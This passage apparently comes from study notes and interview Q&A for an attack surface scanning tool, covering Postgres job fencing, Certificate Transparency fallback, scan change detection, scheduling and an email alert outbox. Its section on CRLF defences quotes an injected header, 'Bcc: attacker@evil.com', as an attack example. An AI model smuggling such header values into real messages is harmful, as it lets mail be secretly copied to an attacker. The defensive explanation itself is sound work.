  1. **Transactional Integrity:** Enqueuing, job state transitions, and result persistence happen in the same ACID database. There is zero risk of dual-write discrepancies (e.g. state committed to Postgres but Redis job lost on broker crash).
  2. **No Extra Infrastructure:** Adding Redis, Celery, or RabbitMQ introduces extra network hops, connection management, serialization overhead, and another failure domain to monitor and secure. PostgreSQL handles thousands of jobs per second with `SKIP LOCKED` before dedicated queues are needed.

---

### Question 2: What is the "Zombie Worker" problem, and how do fencing tokens (`claim_token`) prevent database corruption?
**Answer:**
- **The Zombie Worker Scenario:** Suppose Worker A claims a job with a 60-second lease. Due to a prolonged garbage-collection pause, heavy CPU thrashing, or a transient network partition, Worker A becomes unresponsive. Its lease expires. The recovery loop detects the expired lease and re-queues the run. Worker B claims the run and begins executing Stage 2. Suddenly, Worker A wakes back up ("zombie") and attempts to write its delayed Stage 1 results, potentially overwriting Worker B's fresh data.
- **Fencing Token Solution:**
  1. On every claim, a fresh `claim_token` (UUID) is generated and saved on `scan_runs`.
  2. Every write transaction (stage start, result write, status update) must begin with:
     ```sql
     SELECT 1 FROM scan_runs
     WHERE id = :id AND status = 'running' AND claim_token = :token
     FOR SHARE;
     ```
  3. Because Worker B received a new `claim_token`, Worker A's fencing check returns 0 rows. Worker A detects it has lost the lease, raises `LostLeaseError`, and immediately aborts execution without modifying the database.

---

### Question 3: Why use a partial unique index (`WHERE status IN ('queued', 'running')`) rather than an application-level check-then-insert query?
**Answer:**
- **Check-then-Insert Race Condition:** In an application-level check (`if existing_scan: return 409; else: insert()`), two concurrent HTTP requests arriving at the exact same millisecond can both query the database simultaneously, both find no active scan, and both proceed to insert a new scan run.
- **Database-Level Partial Unique Index:**
  ```sql
  CREATE UNIQUE INDEX uq_scan_runs_active_domain ON scan_runs (domain_id)
  WHERE status IN ('queued', 'running');
  ```
  PostgreSQL enforces uniqueness at the storage engine level. When two concurrent transactions attempt to insert active runs for the same `domain_id`, PostgreSQL forces one to succeed and instantly aborts the other with a `UniqueViolation` error. The API catches this error and returns `409 Conflict` containing the active scan ID, eliminating race conditions entirely.

---

### Question 4: Why must network I/O never be performed inside an open database transaction, and why are fenced writes structured as short transactions?
**Answer:**
- **Connection Pool Exhaustion:** Database connection pools are finite (typically 10–50 connections). If a worker begins a transaction (`session.begin()`) and then executes an HTTP probe or port scan taking 10 to 30 seconds, that database connection remains idle and held for the entire duration of the network call. Under slight load, all database connections become exhausted, starving API requests and health checks.
- **Row Lock Accumulation:** Open transactions hold locks on affected rows. If locks remain open during slow network calls, other workers or API queries trying to read or update those records block indefinitely.
- **Short Transactions Pattern:**
  1. The worker opens a short transaction ($\approx 1\text{ms}$), checks the fence token via `FOR SHARE`, updates the stage status to `running`, and immediately commits and releases the DB connection.
  2. Network reconnaissance executes outside the database transaction.
  3. Once finished, another short transaction ($\approx 2\text{ms}$) opens, verifies the fence token, inserts the artifact into `scan_results`, marks the stage as `succeeded`, and immediately commits.

---

### Question 5: How does dynamic exponential backoff with jitter in SQL prevent the "thundering herd" problem during worker crash recovery?
**Answer:**
- **The Problem:** If a worker node crashes or network partition occurs while 20 scan jobs are running, their leases will all expire around the same time. If a recovery query resets all 20 jobs to `'queued'` simultaneously with zero delay, all available workers will pounce on those 20 jobs at the exact same moment. If the failure was caused by target rate-limiting (e.g. crt.sh returning HTTP 429), slamming the target immediately will cause all 20 retried jobs to fail again.
- **The Solution (Exponential Backoff with Jitter in SQL):**
  ```sql
  next_attempt_at = now() + (
      LEAST(120.0, 10.0 * POWER(2.0, GREATEST(0, attempts - 1)))
      + (random() * 5.0)
  ) * INTERVAL '1 second'
  ```
  1. **Exponential Scaling:** Each failed attempt doubles the delay ($10\text{s} \to 20\text{s} \to 40\text{s}$, capped at 120s), giving remote servers and network partitions time to recover.
  2. **Random Jitter ($0\text{s} \text{ to } 5\text{s}$):** Introduces randomization so that the 20 recovered jobs become eligible for claiming at staggered, smoothed intervals rather than all at once, preventing thundering-herd stampedes.

---

# Part 6: v2.2.1 — Fallback Certificate Transparency Discovery Source

## 1. Plain-English Code Walkthrough

### Why CT Fallback Was Introduced
- **The Problem:** In live testing, `crt.sh` exhibited significant unreliability (failing 3 out of 4 attempts with HTTP 404, HTTP 502, and connection timeouts). Relying solely on `crt.sh` made it a single point of failure (SPOF) for the entire reconnaissance pipeline. If discovery failed, all subsequent stages (`probe`, `portscan`, `inspect`, `score`) were skipped.
- **The Solution:** Added automated, transparent fallback to the **SSLMate Cert Spotter API** (`https://api.certspotter.com/v1/issuances`). When `crt.sh` exhausts its retry budget (3 attempts with exponential backoff), the orchestrator automatically queries Cert Spotter without user intervention or pipeline failure.

### Key Differences: `crt.sh` vs. `Cert Spotter`
1. **Unexpired vs. Historical Certificates:**
   - `crt.sh` queries public Certificate Transparency logs across all time, returning active, expired, revoked, and legacy certificates.
   - Cert Spotter's public/free issuances API returns only **unexpired** certificates. While this slightly reduces historical asset visibility (e.g. dormant subdomains that had certificates years ago and never renewed), it guarantees discovered assets are current and prevents pipeline stalling.
2. **Pagination Architecture:**
   - `crt.sh` returns all records in a single monolithic JSON payload (often causing server-side query timeouts on large domains).
   - Cert Spotter paginates using issuance ID tokens (`&after=<last_id>`), terminating with an empty list `[]`.
3. **Bounding and Guardrails:**
   - Capped at `MAX_CERTSPOTTER_PAGES = 10` pages and `MAX_CERTSPOTTER_ENTRIES = 5000` entries to prevent unbounded memory growth and rate limit bans.
   - When capped, the report records `"truncated": true`.
4. **Rate Limit (429) & Retry-After Handling:**
   - If Cert Spotter returns HTTP 429 with `Retry-After <= 10.0s`, the client waits that exact duration and retries once.
   - If `Retry-After > 10.0s` or a second 429 is encountered, `CertSpotterError` is raised immediately.

### Code Organization & Shared Processing
- **Exception Hierarchy:**
  `DiscoveryError(Exception)` acts as the base exception. `CrtshError`, `CertSpotterError`, and `AllSourcesFailedError` inherit from it. The worker's `EXPECTED_SCANNER_ERRORS` and the CLI catch `DiscoveryError`.
- **Parsing Reuse:**
  `transform_certspotter_to_raw_records()` transforms Cert Spotter `dns_names` lists into `name_value` newline-delimited strings, allowing 100% reuse of `parse_subdomains()` for wildcard stripping, lowercasing, deduplication, and scope validation.
- **Auditability & Error Sanitization:**
  `DiscoveryReport` records `"source": "crt.sh"` or `"source": "certspotter"`, `"fallback_reason"` (sanitized with `sanitize_error_text`, max 300 chars, stripped of control characters), and `"truncated": true|false`.
- **Secret Protection:**
  Optional `CERTSPOTTER_API_KEY` is sent as a `Bearer` token in the `Authorization` header, never logged, and never included in exception messages or reports.

---

## 2. Three Step 2.2.1 Cybersecurity Interview Questions & Answers

### Question 1: Why is passive reconnaissance reliant on a single Certificate Transparency aggregator brittle, and how does secondary source fallback improve pipeline reliability?
**Answer:**
- **The Brittleness of Free Public APIs:** Public CT search engines like `crt.sh` operate on donated infrastructure, ingesting billions of certificate entries from global CT logs. They frequently experience database lock contention, 502/504 gateway timeouts, rate limiting, and maintenance outages under heavy automated scraping load.
- **Single Point of Failure (SPOF):** In a phased reconnaissance pipeline where downstream stages depend on initial asset discovery, a transient failure in the CT search engine halts the entire pipeline, preventing security analysts from discovering live attack surfaces.
- **Multi-Source Resilience:** Implementing secondary source fallback (such as SSLMate Cert Spotter) decouples pipeline availability from any single provider. By catching primary provider exhaustion and falling back to a structurally distinct API, the pipeline maintains high availability while tracking the exact fallback reason for transparency and auditability.

---

### Question 2: What is the architectural difference between crt.sh's historical log queries and Cert Spotter's unexpired-only issuance API, and what are the implications for attack surface visibility?
**Answer:**
- **crt.sh (Full Historical Archives):**
  - Indexes all CT log entries indefinitely. Queries return historical subdomains that held certificates months or years in the past, even if the domain was decommissioned or the certificate expired.
  - *Implication:* Excellent for uncovering historical assets, forgotten infrastructure, and potential subdomain takeover candidates (e.g. dangling CNAMEs for decommissioned services), but queries are slow and frequently time out.
- **Cert Spotter (Active / Unexpired Issuances):**
  - The public endpoint indexes currently valid, unexpired certificate issuances.
  - *Implication:* Faster query response times, smaller payloads, and near-zero noise from long-dead subdomains. However, it will not discover dormant subdomains whose certificates expired and were not renewed.
- **Defensive Design:** Treating `crt.sh` as the primary source ensures full historical visibility when available, while Cert Spotter acts as a fast, reliable fallback to guarantee active surface discovery when the primary aggregator is down.

---

### Question 3: How does bounded pagination with strict `Retry-After` enforcement prevent resource exhaustion and abusive request spikes?
**Answer:**
- **The Bounded Pagination Principle:** Without bounds, querying a massive wildcard domain (e.g. `*.wordpress.com` or cloud providers) could yield tens of thousands of pages, exhausting worker memory, consuming the entire rate limit quota, and hanging scanner workers for hours. Enforcing a hard page cap (10 pages) and entry cap (5,000 records), accompanied by a boolean `"truncated": true` audit flag, bounds execution time and resource consumption.
- **`Retry-After` Threshold Guardrail:**
  - Automated scanners that blindly retry on HTTP 429 can enter aggressive tight loops, triggering IP blacklisting or abusive traffic complaints.
  - Conversely, scanners that wait arbitrarily long (e.g. `Retry-After: 3600`) cause background workers to block and freeze execution.
  - Setting a threshold (`Retry-After <= 10.0s`) allows the client to absorb momentary rate limiter bursts (sleeping and retrying once), while immediately aborting if the delay would cause worker lease timeouts, cleanly failing over to poison-pill/retry mechanisms.

---

# Part 7: v2.3 — Attack Surface Change Detection Between Scans

## 1. Plain-English Code Walkthrough

### Motivation & Architecture
- **The Operational Problem:** Periodic scanning produces isolated snapshots in time. An analyst reviewing 1,000 hosts across multiple scan runs cannot manually inspect thousands of JSON lines to answer: *"What changed since our last scan? Did a new database port open? Did an SSL certificate expire? Was an HSTS header dropped?"*
- **The Core Solution:** An automated differential engine executed upon scan completion. The engine locates the strictly earlier (`id < :current_id`) succeeded scan of the same domain, compares all stage reports, and records structured changes (`scan_changes` table) along with a summary JSON (`scan_runs.change_detection`).
- **Pure Function Isolation (`detect_changes`):**
  The comparison algorithm is decoupled from I/O, database transactions, and network calls. It accepts two dictionaries (`baseline_reports` and `new_reports`) and an `allow_removal` flag, returning a list of change dictionaries. This enables comprehensive unit testing with static fixtures and guaranteed deterministic output.

### Finding-Based Diffing vs. Raw Field Diffing
- **The Problem with Raw Field Diffing:**
  Directly comparing JSON fields between scans (e.g., diffing `not_after`, `present_headers`, or open port lists) leads to brittle logic, duplicate business rules, and arbitrary severity invention. For example, comparing `not_after` strings cannot tell whether a certificate is expiring soon or expired, and inventing severities at the diff stage creates multiple conflicting sources of truth.
- **The Finding-Based Solution:**
  `src/asm/changes.py` delegates finding generation directly to the battle-tested evaluators in `src/asm/scoring.py` (`evaluate_probe_findings`, `evaluate_portscan_findings`, `evaluate_inspect_findings`).
  - Findings are generated for both baseline and new reports using the exact same rules and catalog.
  - Diffing is performed per `(host, finding_code, detail)`.
  - **Exposure Additions:** A finding present only in the new scan inherits its exact severity tier (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`) directly from `FINDING_CATALOG` in `scoring.py`.
  - **Exposure Reductions:** A finding present only in the baseline is classified as an exposure reduction with `INFO` severity—**provided** the host was successfully evaluated in the new scan (`status == "PROBED"`). If the host was unreachable or skipped, baseline findings are not resolved.
  - This guarantees that risk scoring and change detection stay 100% synchronized with zero duplicated finding rules or invented severities.

### "Unknown" Is Not "Absent"
- A foundational law in defensive reconnaissance: **a failed observation does not equal the absence of a service or asset.**
- **Network Flakes & Timeouts:**
  - If a DNS query times out (`TIMEOUT`) or returns `ERROR`, the host might still exist. Emitting `STOPPED_RESOLVING` or `REMOVED_SUBDOMAIN` would create alarming false alerts. Only a definitive `RESOLVED` $\rightarrow$ `NXDOMAIN` transition triggers `STOPPED_RESOLVING`.
  - If a port probe times out (`FILTERED`), a packet was dropped by a firewall or network blip. Emitting `PORT_NO_LONGER_OPEN` would lead security teams to believe a vulnerability was patched when it was merely packet loss. Only an explicit `CLOSED` state (RST received from the host) confirms the port is shut.
  - If an HTTPS probe times out (`error_type == "TIMEOUT"`), `HTTPS_LOST` is not emitted. Only definitive errors (e.g. `CONNECT_ERROR`, `TLS_ERROR`) confirm that the HTTPS listener failed.

### Source Awareness & Truncation Safety Rules
- **The Threat of Source Switching:**
  - `crt.sh` returns historical, active, and expired certificates across all time.
  - `Cert Spotter` returns only currently unexpired issuances.
  - If Scan 1 used `crt.sh` and Scan 2 fell back to `Cert Spotter`, comparing subdomain sets would falsely report that hundreds of older subdomains were "removed" (`REMOVED_SUBDOMAIN`).
- **The Threat of Pagination Truncation:**
  - If Cert Spotter hits its page cap (10 pages) or entry cap (5,000 records) on a large domain, the report records `"truncated": true`.
  - Comparing a truncated scan against an untruncated baseline would erroneously report all subdomains beyond page 10 as deleted.
- **The Defensive Rule:**
  `evaluate_removal_eligibility` enforces that subdomain deletions are evaluated **if and only if**:
  1. Both discovery reports share the exact same discovery source (`base_source == new_source`).
  2. Neither report has `truncated == True`.
  If either condition fails, removal detection is skipped and the reason is recorded in `scan_runs.change_detection["skip_reason"]`.

### Database Design & Atomic Worker Finalization
- **Schema & Indexes:**
  `scan_changes` table stores:
  `domain_id` (FK), `scan_run_id` (FK), `baseline_scan_run_id` (FK), `change_type`, `category` (`exposure` or `summary`), `severity`, `asset`, `detail`, `evidence`, `previous_state`, `new_state`, `observed_at`.
  Unique constraint: `uq_scan_changes_run_type_asset_detail` on `(scan_run_id, change_type, asset, detail)`.
  Composite index: `ix_scan_changes_domain_observed` on `(domain_id, observed_at DESC)`.
- **Atomic Fenced Finalization:**
  Changes are computed in-memory prior to committing the scan. If detection raises an exception, the exception is caught, logged, and stored in `summary["error"]` without failing the scan run. The changes and the final run status update (`status = 'succeeded'`) are committed atomically in the same database transaction.

---

## 2. Five Step 2.3 Cybersecurity Interview Questions & Answers

### Question 1: Why is "unknown is not absent" a critical design principle in attack surface monitoring, and what vulnerabilities or operational failures occur when scanners violate it?
**Answer:**
In network reconnaissance, an observation failure is not evidence of absence. When a scanner attempts to probe an asset and receives no response, two fundamentally different physical realities could have occurred:
1. **Definite Absence:** The service was turned off, port closed with a TCP `RST`, or hostname deleted with an authoritative `NXDOMAIN`.
2. **Indeterminate State (Unknown):** A packet was dropped by an intermediate firewall (`FILTERED`), an upstream ISP route flapped, the DNS recursive resolver timed out (`TIMEOUT`), or the host hit a temporary connection limit.

**Consequences of Violating the Principle:**
- **Premature Vulnerability Closure (False Remediation):** If a firewall drops a probe packet against an exposed MySQL port (`3306`), a naive scanner that treats non-response as "absent" will emit `PORT_NO_LONGER_OPEN` and auto-close the ticket. The security team erroneously marks the finding as remediated while the database remains vulnerable to anyone bypassing the firewall.
- **Notification Alert Fatigue:** If transient DNS timeouts cause subdomains to flip between "discovered", "removed", and "re-added" every day, analysts suffer from alert fatigue and begin ignoring notifications.
- **Defensive Safeguard:** Exposight requires explicit, positive counter-evidence before emitting removal or closure changes (e.g. `NXDOMAIN` for DNS, `CLOSED` with `RST` for ports, and non-timeout errors for HTTPS).

---

### Question 2: Why is finding-based diffing preferred over raw field diffing when computing exposure changes in an ASM pipeline?
**Answer:**
- **Single Source of Truth for Severity:** In a security platform, finding severity definitions (e.g. exposed DB is `CRITICAL`, missing HSTS is `LOW`, expired cert is `HIGH`) must reside in one authoritative place. If a diffing engine compares raw strings (like comparing certificate dates or HTTP headers) and assigns its own severities, two diverging severity rulesets emerge. In finding-based diffing, changes that introduce new exposure automatically inherit the exact severity tier and points computed by `scoring.py`.
- **Domain Logic Encapsulation:** Raw fields often require multi-field context to interpret. For example, an expired certificate may have `expired: true`, `is_trusted: false`, and `issuer_equals_subject: true`. A raw diff engine might emit three conflicting changes for the same certificate. Scoring rules already implement deduplication precedence (e.g., an expired cert emits only `TLS_CERT_EXPIRED`). Diffing the evaluated finding set guarantees that change events reflect actionable security states rather than noisy JSON key differences.
- **Resilience to Refactoring:** When new inspection rules or scoring tweaks are introduced in `scoring.py`, the change detection engine automatically inherits them without modifying diffing logic.

---

### Question 3: Explain why Certificate Transparency pagination truncation and source switching can cause catastrophic false positive "asset removal" alerts, and how Exposight prevents them.
**Answer:**
- **The Threat of Source Asymmetry:**
  - `crt.sh` is an archival aggregator spanning all historical certificate issuances, including certificates issued years ago for decommissioned subdomains.
  - `Cert Spotter`'s unexpired endpoint only returns certificates that are currently cryptographically valid.
  - If a weekly scan switches from `crt.sh` to `Cert Spotter` (because `crt.sh` timed out), comparing raw subdomain sets would reveal that dozens or hundreds of historical subdomains present in the baseline are missing from the fallback report. A naive diff engine would fire hundreds of `REMOVED_SUBDOMAIN` alerts.
- **The Threat of Truncation:**
  - To prevent memory exhaustion and rate-limit exhaustion, third-party API clients enforce pagination caps (e.g. Cert Spotter stops at 10 pages / 5,000 entries).
  - If a large domain exceeds this cap, its report contains only a subset of assets and sets `"truncated": true`. Comparing this against an uncapped baseline would spuriously declare thousands of un-paginated subdomains as deleted.
- **The Exposight Mitigation:**
  `evaluate_removal_eligibility()` enforces strict conditions: removal detection runs **only** if both the baseline and new scans used the identical source (e.g. both used `crt.sh` or both used `certspotter`) AND neither report was truncated. If either condition is violated, subdomain removal detection is bypassed, and a clear `skip_reason` is stored for transparency.

---

### Question 4: In an automated vulnerability management pipeline, how should the severity of change events be assigned, and why should exposure-reducing changes be treated differently from exposure-increasing changes?
**Answer:**
- **Asymmetric Risk Nature:** An event that *increases* exposure (e.g. a database port newly opening to the public internet, or a valid TLS cert expiring) creates immediate, active exploitability that requires urgent incident response. Therefore, it must inherit the high-priority severity of the vulnerability (`CRITICAL` or `HIGH`) to trigger pager alerts and SIEM escalations.
- **Exposure Reductions Are Informational:** When an exposure is reduced (e.g. port 3306 closes, an expired cert is renewed, or an HSTS header is deployed), risk has decreased. The system is entering a safer state. Firing high-priority alerts for closed ports or renewed certs creates false alarms in SOC triage queues. Therefore, exposure-reducing changes are uniformly classified with `INFO` severity.
- **Verification Prerequisite:** Crucially, an exposure reduction change can only be emitted if the target host was successfully verified as active (`status == "PROBED"`) in the new scan. If the scanner could not reach the host, the finding is not resolved—it remains in an unconfirmed state.

---

### Question 5: How does the worker maintain atomicity and fault tolerance when computing change detection at the end of a scan pipeline?
**Answer:**
- **Fault-Tolerant Isolation (Non-Fatal Diffing):**
  Change detection is a post-processing analysis step; it must never cause an otherwise successful 5-stage scan to be marked as failed. In `_mark_run_final()`, change detection runs inside an isolated `try/except Exception` block. If an unexpected bug occurs during diffing, the worker catches the exception, logs a traceback, and populates `change_detection = {"error": str(err)}` while allowing the scan run to finish with status `succeeded`.
- **Atomic Fenced Commit:**
  If change detection succeeds, the generated change records (`ScanChange` objects) and the final scan run update (`ScanRun.status = 'succeeded'`, `ScanRun.finished_at`, `ScanRun.change_detection = summary`) are persisted within the **exact same database transaction**. If a database connectivity error or deadlock occurs during the commit, both the change records and the status update roll back together, ensuring no orphan change rows are ever left pointing to an unfinalized scan.
- **Idempotency & Deduplication:**
  The `scan_changes` table enforces a database-level unique constraint on `(scan_run_id, change_type, asset, detail)`. Even in the event of worker retries, identical change records cannot be duplicated.

---

# Part 8: v2.4a — Scheduled Scans & Database-Backed Polling

## 1. Plain-English Code Walkthrough

### Motivation & Architecture
- **The Operational Need:** Security monitoring cannot rely on manual API triggers alone. Attack surfaces change continuously as cloud resources spin up, certificates expire, and firewall rules drift. Monitored domains need automated recurring scans (e.g. daily or weekly) with zero human intervention.
- **Why Postgres-Backed Scheduling Instead of Celery Beat or Cron:**
  - *Single Point of Failure (SPOF) Elimination:* Systems like Celery Beat or systemd cron run as a single coordinator process. If the scheduler daemon dies, all scheduling stops across the entire fleet.
  - *No New Infrastructure Dependencies:* Adding Redis, RabbitMQ, or Celery introduces operational complexity, broker clustering, monitoring requirements, and separate failure modes.
  - *Database Clock Authority:* By using PostgreSQL's database clock (`func.now()`), the system avoids NTP synchronization drift between distributed worker hosts.
  - *Seamless High-Availability Concurrency:* Using `FOR UPDATE SKIP LOCKED` allows any number of worker instances to poll the same `domains` table simultaneously. Each due domain is claimed and processed by exactly one worker without distributed lock managers (DLMs) or lock contention.

### De-synchronization Jitter
- **The "Thundering Herd" Problem:**
  When users configure recurring scans, human behavior tends toward round intervals (e.g. 24 hours, starting at 00:00:00 UTC). Without jitter, hundreds or thousands of domains would become due at the exact same second. This would trigger database connection pool exhaustion, sudden outbound network spikes, and severe rate-limiting or firewall bans from Certificate Transparency providers and target hosts.
- **The Solution:**
  The worker adds a random jitter (0 to 300 seconds / 5 minutes) when advancing `next_scan_at`:
  `next_scan_at = now() + (interval_hours * interval '1 hour') + (random_jitter * interval '1 second')`.
  This naturally scatters scan executions evenly across a temporal window, smoothing out infrastructure utilization.

### The "No Backfill" Guarantee
- **The Outage Stampede Hazard:**
  Suppose an enterprise ASM platform experiences an unscheduled 7-day outage for maintenance or database migration. If a domain is configured for 6-hour scans, 28 scheduled execution intervals elapsed during the downtime.
  - In a naive scheduling model (like Airflow or cron with catch-up enabled), the scheduler would attempt to run all 28 missed scans back-to-back.
  - For a platform monitoring 10,000 domains, this would generate 280,000 redundant scan jobs, hopelessly jamming the job queue for weeks.
- **The Exposight Design:**
  Attack Surface Management is stateful and real-time: a security team cares about what the attack surface looks like *right now*, not what it looked like on Tuesday during an outage. By setting `next_scan_at = now() + interval + jitter`, the domain receives exactly **one** catch-up scan upon worker recovery, and its schedule is immediately reset to the future.

### Shared Enqueue & Trigger Provenance
- `src/asm/db/scans.py` encapsulates `enqueue_scan(session, domain_id, trigger, idempotency_key=None)`. Both the user-facing REST API (`POST /domains/{id}/scans`) and the automated worker scheduler call this exact same function.
- The `trigger` column on `scan_runs` explicitly records whether the scan was initiated as `"manual"` or `"scheduled"`, providing clear audit provenance for reporting, billing, and change tracking.

---

## 2. Three Step 2.4a Cybersecurity Interview Questions & Answers

### Question 1: Why is database-backed polling with `FOR UPDATE SKIP LOCKED` preferred over centralized schedulers (like Celery Beat or cron) for multi-worker security scanning platforms?
**Answer:**
- **Elimination of Single Point of Failure (SPOF):** Centralized schedulers like Celery Beat or systemd timers require a dedicated leader instance. If that leader process crashes, runs out of memory, or partitions from the network, the entire recurring scan pipeline halts silently until human intervention. With PostgreSQL-backed polling, the scheduler logic runs inside every worker process before job claiming. As long as at least one worker is alive, scheduled scans continue executing.
- **High Concurrency Without Coordination:** Traditional database row locks (`FOR UPDATE`) cause concurrent workers to block and wait on locked rows, leading to thread starvation and deadlocks. `FOR UPDATE SKIP LOCKED` instructs PostgreSQL to immediately skip rows currently locked by other transactions. Workers seamlessly acquire disjoint sets of due domains with zero locking latency.
- **Clock Authority & Consensus:** In distributed worker clusters, individual host clocks can drift. By anchoring due-domain selection and schedule advancement to the database clock (`now()`), the entire system maintains a unified, consensus-driven time reference.

---

### Question 2: Why must scheduled attack surface scans enforce a strict "no backfill" policy after system outages, and what operational hazards arise if backfilling is permitted?
**Answer:**
- **Reconnaissance is State-Observation, Not Batch Processing:** In data accounting or financial processing, missed transactions must be processed sequentially to maintain balance integrity. In cybersecurity reconnaissance, however, the target is the external environment. Running 20 backfilled port scans for yesterday cannot reconstruct what ports were open yesterday; it merely scans today's infrastructure 20 redundant times.
- **Queue Starvation & Denial of Service:** If a scanner cluster goes offline for 48 hours, backfilling would multiply the queue backlog by orders of magnitude (e.g. 8 missed scans per domain for a 6-hour interval). Upon restart, workers would be swamped executing historical catch-up scans, starving on-demand manual scans requested by incident response teams.
- **Third-Party Rate-Limit Exhaustion:** Sudden bursts of redundant backfilled scans would overwhelm rate limits on critical passive intelligence sources (such as `crt.sh` and Cert Spotter) and trigger IPS blocks from corporate firewalls. The "no backfill" invariant ensures that downtime results in exactly one baseline catch-up scan before returning to normal cadence.

---

### Question 3: How does adding randomized jitter to recurring scan cadences protect both the scanning infrastructure and target organizations?
**Answer:**
- **Mitigating Thundering Herds on Scanner Infrastructure:**
  When recurring jobs are configured on fixed intervals (e.g. "every 24 hours"), they naturally align to round clock boundaries (00:00 UTC). Without jitter, all scheduled jobs trigger at the exact same second, causing extreme CPU spikes, database connection pool exhaustion, and worker queue contention. Random jitter (e.g. 0–300 seconds) spreads the execution distribution across a smooth bell curve.
- **Preventing Target Rate-Limiting & WAF Blocking:**
  Target organizations deploy Web Application Firewalls (WAFs), Intrusion Detection Systems (IDS), and DDoS mitigation appliances that detect volumetric bursts. If a scanner sends thousands of HTTP probes or TCP SYN packets at precisely the top of the hour, security appliances flag the traffic as an aggressive automated attack and ban the scanner's IP addresses. Jitter provides natural traffic dispersion that mimics normal operational patterns.
- **Preventing External Provider Bans:**
  Free passive reconnaissance services like Certificate Transparency logs enforce strict queries-per-minute rate limits. Jitter prevents multiple worker nodes from exhausting provider quotas simultaneously.

---

# Part 9: v2.4b — Transactional Outbox Pattern & Attack Surface Alerting

## 1. Plain-English Code Walkthrough

### Motivation & The Dual-Write Problem in Security Alerting
- **The Dual-Write Vulnerability:**
  When an attack surface scan finishes and uncovers a newly exposed critical vulnerability (e.g., an internet-facing database port `3306`, a self-signed cert on an admin portal, or an expired wildcard certificate), an alert must be transmitted to security engineers.
  A naive implementation attempts dual-writing across heterogeneous systems:
  1. Commit the scan changes and mark the scan run `succeeded` in PostgreSQL.
  2. Send an email notification via an SMTP server.
  - If the application crashes, network drops, or worker runs out of memory between step 1 and step 2, the scan completes in the database, but **the security alert is permanently lost**. The vulnerability remains undetected by the team until someone manually checks the dashboard.
  - If the order is reversed (send email first, then commit to PostgreSQL), an SMTP success followed by a database serialization failure, deadlock, or crash results in **ghost alerts**—the security team receives an alert for a scan run that does not exist in the database.
  - If the SMTP server hangs, the open database transaction holds connections and row locks, causing pool exhaustion.
- **The Solution (Transactional Outbox Pattern):**
  Instead of sending emails synchronously during scan finalization, the worker inserts alert notification rows (`alert_notifications` table) into PostgreSQL within the **exact same fenced transaction** that records the detected changes and marks `scan_runs.status = 'succeeded'`.
  Because both writes share a single ACID transaction, either both are committed or neither is. The alert cannot be lost, ghost alerts are impossible, and scan completion is decoupled from external SMTP server availability.

### In-Memory Pre-Building & Fault Isolation
- **Non-Fatal Alerting Invariant:**
  Alert processing is a secondary notification mechanism; a bug in alert formatting or SMTP recipient parsing must **never** fail an otherwise successful 5-stage reconnaissance scan.
- **Fault-Isolated Execution:**
  In `_mark_run_final()`:
  1. Alert trigger rules (`should_trigger_alerts()`) and digest formatting (`build_alert_digest()`) execute entirely in memory *prior* to opening the final database transaction.
  2. This computation is enclosed in an isolated `try/except Exception` block.
  3. If an unexpected error occurs during digest building (e.g. unexpected character encoding or malformed report structure), the worker logs the traceback, sanitizes the error string, stores it under `scan_runs.change_detection["alert_error"]`, generates zero alert rows, and proceeds to commit the scan run as `succeeded`.

### Outbox Polling & Delivery Invariants
- **Worker Polling Integration:**
  At the conclusion of each worker poll cycle (after scheduling due scans and claiming queued jobs), the worker calls `deliver_pending_alerts()`.
- **Claiming with `FOR UPDATE SKIP LOCKED`:**
  The worker selects up to 10 due notifications (`status = 'pending' AND next_attempt_at <= now()`) ordered by `created_at ASC` using `FOR UPDATE SKIP LOCKED`. This allows multiple distributed worker instances to deliver outbox messages concurrently without coordination or duplicated sends.
- **Holding Row Lock During SMTP Send vs. Two-Phase Commit (2PC):**
  Unlike scan stages where network reconnaissance executes outside database transactions, outbox delivery intentionally **holds the row lock on that single notification record during the SMTP transmission**.
  - *Rationale:* In a distributed worker fleet, if a worker released the lock or committed an intermediate `"sending"` state before transmitting, a worker crash or lease recovery mechanism could re-claim the row and send a duplicate email to executives or clients.
  - *Bounded Risk:* By strictly bounding the SMTP socket connection and command timeout to **10 seconds**, the database connection is held for at most 10 seconds. This provides guaranteed mutual exclusion and eliminates double sends without requiring heavyweight distributed transaction managers or two-phase commit (2PC) protocols.
  - Once the SMTP server accepts the message (`250 OK`), the worker marks `status = 'sent'` and `sent_at = now()`, committing the transaction and releasing the lock.
- **Database-Calculated Exponential Backoff:**
  If the SMTP connection fails, times out, or encounters a temporary handshake error, the worker increments `attempts` and sets:
  ```sql
  next_attempt_at = now() + make_interval(secs => :s)
  ```
  Delays scale exponentially (`[30, 60, 120, 240]` seconds) up to `max_attempts = 5`. If all attempts fail, `status` transitions to `'failed'` and `last_error` records the sanitized failure reason.

### Security Hardening: CRLF Injection Defense & Input Sanitization
- **CRLF Injection Vulnerability:**
  In SMTP and HTTP protocols, headers and body are delimited by Carriage Return (`\r`) and Line Feed (`\n`). If untrusted strings (such as hostnames, open port service banners, or recipient addresses) contain CRLF sequences, an attacker can inject malicious headers (e.g. `Bcc: attacker@evil.com` or `Subject: Urgent Security Wire Transfer`).
- **Defensive Safeguards:**
  1. `clean_header()` strips all `\r` and `\n` characters from `Subject`, `From`, and `To` headers.
  2. Pydantic schema `DomainAlertsUpdate` explicitly rejects any recipient email containing `\r` or `\n` and validates format using `EmailStr` (RFC 5322).
  3. Untrusted findings in the email body are sanitized (`clean_body_text`) and bounded to 200 characters to prevent prompt injection or terminal escape sequences.
  4. Emails are formatted strictly as plain-text (`text/plain`, UTF-8). HTML email is intentionally prohibited, preventing cross-site scripting (XSS), CSS exfiltration, and tracking pixel rendering in security analysts' email clients.

---

## 2. Five Step 2.4b Cybersecurity Interview Questions & Answers

### Question 1: What is the "dual-write problem" in distributed systems, and how does the Transactional Outbox pattern solve it for critical cybersecurity alert pipelines?
**Answer:**
- **The Dual-Write Problem:**
  The dual-write problem occurs when an application must update two independent distributed systems as part of a single logical event—such as updating a state database (PostgreSQL) and notifying an external messaging service (SMTP, PagerDuty, or Slack). Because distributed systems lack a unified ACID boundary across different technologies, one operation can succeed while the other fails.
  - If the database commits first and the process crashes before the message is sent, the event is lost. In cybersecurity, this means a critical vulnerability alert is never delivered.
  - If the message is sent first and the database transaction aborts or deadlocks, the message becomes a "ghost alert" referencing non-existent data.
- **The Transactional Outbox Solution:**
  The Transactional Outbox pattern converts the external communication into a local database table (`alert_notifications`). The application writes both the domain attack surface changes and the pending alert notifications within the **exact same local database transaction**.
